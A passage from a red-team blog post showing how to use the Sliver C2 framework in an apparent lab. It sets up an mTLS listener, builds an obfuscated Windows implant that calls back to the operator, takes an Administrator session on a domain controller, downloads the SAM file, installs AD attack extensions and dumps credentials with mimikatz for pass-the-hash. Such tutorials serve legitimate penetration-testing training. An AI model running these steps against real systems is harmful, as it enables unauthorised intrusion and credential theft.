+<p>Sliver supports multiple protocols:</p>
+<ul>
+<li><strong>HTTP / HTTPS</strong> - works where outbound HTTP/S is allowed</li>
+<li><strong>mTLS</strong> - Mutual TLS, highly secure, great for labs and internal networks</li>
+<li><strong>DNS</strong> - slow but firewall-evasive</li>
+<li><strong>WireGuard</strong> - VPN-based C2</li>
+</ul>
+<p>Creating an mTLS listener:</p>
+<pre><code>[server] sliver &gt; mtls --lhost 10.10.15.5 --lport 4444
+
+[*] Starting mTLS listener ...
+[*] Successfully started job #1</code></pre>
+<figure>
+<img alt="Create mTLS Listener and Generate Implant" loading="lazy" src="../pic/sliver-2-listener.png"/>
+<figcaption>mTLS Listener running on 10.10.15.5:4444</figcaption>
+</figure>
+
+<h2>Generating an Implant</h2>
+<p>Sliver has two main implant types:</p>
+<ul>
+<li><strong>Session</strong> - Interactive real-time connection. Good for short engagements.</li>
+<li><strong>Beacon</strong> - Sleeps between check-ins at a defined interval. Better OPSEC, ideal for long-term engagements.</li>
+</ul>
+<p>Generating a Session implant for Windows x64:</p>
+<pre><code>[server] sliver &gt; generate --mtls 10.10.15.5:4444 --os windows --arch amd64
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 43s
+[*] Implant saved to /home/sabastiaz/Tools/silver/Server/RAW_CAMPANILE.exe</code></pre>
+<p>Sliver auto-generates a random name for each implant (e.g. <code>RAW_CAMPANILE</code>) and enables Symbol Obfuscation by default to reduce detection.</p>
+<h3>Key Flags</h3>
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--mtls</code></td><td>Use mTLS protocol</td></tr>
+<tr><td><code>--os windows</code></td><td>Target OS</td></tr>
+<tr><td><code>--arch amd64</code></td><td>Target architecture</td></tr>
+<tr><td><code>--beacon</code></td><td>Generate as Beacon instead of Session</td></tr>
+<tr><td><code>--sleep 30</code></td><td>Beacon check-in interval (seconds)</td></tr>
+<tr><td><code>--format shellcode</code></td><td>Output as shellcode</td></tr>
+</tbody>
+</table>
+
+<h2>Target Connects Back</h2>
+<p>Once the implant runs on the target, Sliver Server immediately notifies you:</p>
+<pre><code>[*] Session e086f581 RAW_CAMPANILE - 10.129.29.250:52651 (dc) - windows/amd64 - Sat, 27 Jun 2026 17:53:43 +07</code></pre>
+<p>List all sessions with <code>sessions</code>, then interact with <code>use</code>:</p>
+<pre><code>[server] sliver &gt; sessions
+
+ID        Name          Transport  Remote Address       Hostname  Username
+========  ============  =========  ===================  ========  ====================
+e086f581  RAW_CAMPANILE mtls       10.129.29.250:52651  dc        SUPPORT\Administrator
+
+[server] sliver &gt; use e086f581</code></pre>
+<figure>
+<img alt="Session Connected" loading="lazy" src="../pic/sliver-3-session.png"/>
+<figcaption>RAW_CAMPANILE session from dc (SUPPORT\Administrator) - ALIVE</figcaption>
+</figure>
+<p>Information Sliver displays per session:</p>
+<ul>
+<li><strong>ID</strong> - Session ID for interacting</li>
+<li><strong>Name</strong> - Random implant name</li>
+<li><strong>Remote Address</strong> - Target IP</li>
+<li><strong>Hostname</strong> - Machine hostname</li>
+<li><strong>Username</strong> - User context running the implant</li>
+<li><strong>Process (PID)</strong> - Process the implant is hiding in</li>
+</ul>
+
+<h2>Basic Commands</h2>
+<p>After <code>use &lt;session-id&gt;</code>, you enter an interactive session with the target:</p>
+<pre><code># System info
+[server] sliver (RAW_CAMPANILE) &gt; info
+
+# Open a shell
+[server] sliver (RAW_CAMPANILE) &gt; shell
+
+# Upload a file
+[server] sliver (RAW_CAMPANILE) &gt; upload /local/file.exe C:\remote\file.exe
+
+# Download a file
+[server] sliver (RAW_CAMPANILE) &gt; download C:\Windows\System32\SAM /tmp/SAM
+
+# Screenshot
+[server] sliver (RAW_CAMPANILE) &gt; screenshot
+
+# List processes
+[server] sliver (RAW_CAMPANILE) &gt; ps</code></pre>
+<h3>Armory - Extension Manager</h3>
+<p>One of Sliver's standout features is <strong>Armory</strong>, an extension manager for installing BOFs (Beacon Object Files) and other extensions with ease.</p>
+<pre><code>[server] sliver &gt; armory</code></pre>
+<figure>
+<img alt="Sliver Armory" loading="lazy" src="../pic/sliver-4-armory.png"/>
+<figcaption>Armory packages - BOF tools and C2TC extensions ready to install</figcaption>
+</figure>
+<p>Notable extensions from Armory:</p>
+<ul>
+<li><code>bof-roast</code> - Kerberoasting via BOF</li>
+<li><code>c2tc-kerberoast</code> - Kerberoast against AD</li>
+<li><code>c2tc-lapsdump</code> - Dump LAPS passwords</li>
+<li><code>c2tc-addmachineaccount</code> - Add Machine Account in AD</li>
+<li><code>c2tc-petitpotam</code> - PetitPotam coercion attack</li>
+<li><code>c2tc-domaininfo</code> - Enumerate AD information</li>
+</ul>
+<p>Install an extension with:</p>
+<pre><code>[server] sliver &gt; armory install bof-roast</code></pre>
+
+<h2>Real Red Team Workflow</h2>
+<p>A real-world workflow combining Sliver with Metasploit:</p>
+<pre><code>Initial Access
+  ↓
+Metasploit (Exploit / CVE)
+  ↓
+Meterpreter Session
+  ↓
+Execute Sliver Implant
+  ↓
+Beacon / Session
+  ↓
+Credential Dump
+  ↓
+Lateral Movement
+  ↓
+Persistence
+  ↓
+Collection
+  ↓
+Cleanup</code></pre>
+<p>Example: Credential dumping through Sliver using the <strong>Mimikatz</strong> extension:</p>
+<pre><code>[server] sliver (RAW_CAMPANILE) &gt; mimikatz sekurlsa::logonpasswords</code></pre>
+<figure>
+<img alt="Mimikatz Credential Dump via Sliver" loading="lazy" src="../pic/sliver-5-mimikatz.png"/>
+<figcaption>mimikatz sekurlsa::logonpasswords - extracting NTLM hash of DC$ machine account</figcaption>
+</figure>
+<p>From this output we can extract the NTLM hash of the DC$ machine account, which can be used for Pass-the-Hash or Silver Ticket attacks.</p>
+<blockquote>Sliver doesn't replace Metasploit - it enhances the Post-Exploitation phase with flexibility suited for long-term operations.</blockquote>
+
+<h2>Summary</h2>
+<p>From firing up <code>./sslarm</code>, creating a Listener with <code>mtls</code>, generating an implant, watching a Session come back <strong>ALIVE</strong>, all the way to dumping credentials - that's the full flow Sliver handles in a real Red Team engagement.</p>
+<p>Sliver isn't here to replace Metasploit. It fills the gap Metasploit was never great at: <strong>long-term control</strong> with better OPSEC, flexible beaconing, and Armory extensions that cover nearly every AD attack path you'll need.</p>
+<p>If you've only ever used Metasploit + Meterpreter, give Sliver a spin - it's not as complex as it looks, and the workflow fits real-world engagements far better than you'd expect.</p>
+
+</div>
+
+<div class="share-section">
+<span class="share-label">แชร์บทความนี้</span>
+<div class="share-buttons">
+<a class="share-btn share-x" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewBox="0 0 24 24" width="14"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.742l7.733-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+X / Twitter
+</a>
+<a class="share-btn share-li" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewBox="0 0 24 24" width="14"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+LinkedIn
+</a>
+<a class="share-btn share-fb" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewBox="0 0 24 24" width="14"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+Facebook
+</a>
+<button class="share-btn share-copy" onclick="copyLink(this)">
+<svg fill="none" height="14" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="14"><rect height="13" rx="2" ry="2" width="13" x="9" y="9"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+<span>Copy Link</span>
+</button>
+</div>
+</div>
+
+<div class="post-footer">
+<div class="author-card">
+<img alt="Sabastiaz" class="author-avatar" src="../pic/Sabastiaz_Sly.png"/>
+<div>
+<div class="author-name">Sabastiaz</div>
+<div class="author-creds">Red Team Sorcerer | OSEP | OSCP | CAPE | CPTS | CRTO | C-ADPenX | Tenable.VM Specialist | Tenable Guardian Thailand</div>
+</div>
+</div>
+<div class="post-navlinks">
+<a class="post-navlink prev" href="cape.html"><span class="post-navlink-label">← Previous</span><span class="post-navlink-title">My Journey Through HTB Certified Active Directory Pentesting Expert (CAPE)</span></a>
+<a class="post-navlink next" href="godpotato.html"><span class="post-navlink-label">Next →</span><span class="post-navlink-title">GodPotato - รายงานเชิงเทคนิค (Windows PrivEsc)</span></a>
+</div>
+<a class="post-back" href="../writings.html">← Back to Tomes</a>
+</div>
+
+</div>
+</div>
+<script src="../stars.js"></script>
+<script>
+  const ham=document.getElementById('nav-hamburger');
+  const ul=document.querySelector('.nav-links');
+  if(ham)ham.addEventListener('click',()=>{
+    const open=ham.getAttribute('aria-expanded')==='true';
+    ham.setAttribute('aria-expanded',String(!open));
+    ul.classList.toggle('open',!open);
+  });
+</script>
+<script src="../notif.js"></script>
+<script>
+(function(){
+  var u=encodeURIComponent(location.href);
+  var t=encodeURIComponent(document.title);
+  var x=document.querySelector('.share-x');
+  var li=document.querySelector('.share-li');
+  var fb=document.querySelector('.share-fb');
+  if(x)x.href='https://twitter.com/intent/tweet?url='+u+'&text='+t;
+  if(li)li.href='https://www.linkedin.com/sharing/share-offsite/?url='+u;
+  if(fb)fb.href='https://www.facebook.com/sharer/sharer.php?u='+u;
+})();
+function copyLink(btn){
+  navigator.clipboard.writeText(location.href).then(function(){
+    var span=btn.querySelector('span');
+    span.textContent='✓ Copied!';
+    btn.style.color='var(--gold)';
+    btn.style.borderColor='var(--gold)';
+    setTimeout(function(){span.textContent='Copy Link';btn.style.color='';btn.style.borderColor='';},2000);
+  });
+}
+</script>
+<script>
+(function(){
+  var pill=document.getElementById('lang-pill');
+  if(!pill)return;
+  var m=document.documentElement.className.match(/lang-(\w+)/);
+  var lang=m?m[1]:'th';
+  function set(l){
+    document.documentElement.classList.remove('lang-th','lang-en');
+    document.documentElement.classList.add('lang-'+l);
+    localStorage.setItem('siteLang',l);
+    pill.querySelector('.lang-th').classList.toggle('active',l==='th');
+    pill.querySelector('.lang-en').classList.toggle('active',l==='en');
+  }
+  pill.querySelector('.lang-th').addEventListener('click',function(e){e.preventDefault();set('th');});
+  pill.querySelector('.lang-en').addEventListener('click',function(e){e.preventDefault();set('en');});
+  set(lang);
+})();
+</script>
+
+<button id="back-to-top" aria-label="Back to top">↑</button>
+<script>
+(function(){
+  var btn=document.getElementById('back-to-top');
+  window.addEventListener('scroll',function(){btn.classList.toggle('visible',window.scrollY>300);},{passive:true});
+  btn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+})();
+</script>
+
+<script>
+(function(){
+  var toggle=document.getElementById('toc-toggle');
+  var panel=document.getElementById('toc-panel');
+  var list=document.getElementById('toc-list');
+  if(!toggle||!panel||!list)return;
+  toggle.addEventListener('click',function(){panel.classList.toggle('open');});
+
+  function build(){
+    var lang=document.documentElement.className.match(/lang-(\w+)/);
+    lang=lang?lang[1]:'en';
+    var body=document.querySelector('.post-body.lb[lang="'+lang+'"]');
+    list.innerHTML='';
+    if(!body)return;
+    var heads=body.querySelectorAll('h2');
+    heads.forEach(function(h,i){
+      var id='toc-h-'+i;
+      h.id=id;
+      var li=document.createElement('li');
+      var a=document.createElement('a');
+      a.href='#'+id;
+      a.textContent=h.textContent;
+      a.addEventListener('click',function(e){
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({behavior:'smooth',block:'start'});
+        panel.classList.remove('open');
+      });
+      li.appendChild(a);
+      list.appendChild(li);
+    });
+  }
+  build();
+  new MutationObserver(build).observe(document.documentElement,{attributes:true,attributeFilter:['class']});
+})();
+</script>
+<script data-goatcounter="https://sabastiaz.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+</body>
+</html>
